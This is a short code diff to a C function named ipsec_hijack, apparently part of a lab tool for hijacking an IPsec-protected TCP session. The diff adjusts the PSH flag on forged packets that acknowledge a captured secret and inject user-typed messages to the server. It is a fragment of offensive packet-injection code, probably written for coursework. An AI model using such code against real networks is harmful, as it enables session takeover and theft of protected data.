@@ -64,6 +64,7 @@ void ipsec_hijack(char *INTERFACE)
             * when receiver receive a packet from sender, receiver should reply a ACK packet to sender, then sender will know that
             * the packet has been received successfully. So we also have to reply a ACK to server, after we receive the secret.
             */
+            txp.thdr.psh = 0;
             send_msg(&dev, &net, &esp, &txp, NULL);
             *state = WAIT_PKT;
             get_info(&dev, &net, &esp, &txp, state, victim_ip, server_ip, test_for_dissect);
@@ -88,6 +89,7 @@ void ipsec_hijack(char *INTERFACE)
                 return;
             }
             /* send the message you input on the screen to server */
+            txp.thdr.psh = 1;
             send_msg(&dev, &net, &esp, &txp, str);
             *state = WAIT_SECRET;
         }
